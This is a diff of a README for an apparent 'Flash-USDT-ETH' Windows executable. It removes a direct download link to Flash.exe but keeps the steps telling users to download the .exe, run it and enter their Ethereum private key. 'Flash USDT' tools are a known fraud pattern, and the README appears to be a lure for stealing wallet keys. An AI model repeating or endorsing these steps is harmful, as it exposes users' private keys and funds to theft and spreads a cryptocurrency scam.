@@ -35,7 +35,7 @@ A powerful and user-friendly desktop application compiled as a `.exe` for intera
 - **Private Key**: A valid Ethereum private key for signing transactions.
 
 ## 🚀 How to Use
-1. **Download**: Grab the latest `.exe` from the [Releases](https://github.com/mr-nomad/Flash-USDT-ETH/blob/main/Flash.exe) section.
+1. **Download**: Grab the latest `.exe` from the Releases section.
 2. **Run**: Launch the `.exe` file on your Windows machine.
 3. **Setup**:
    - Input your private key to load your wallet details.
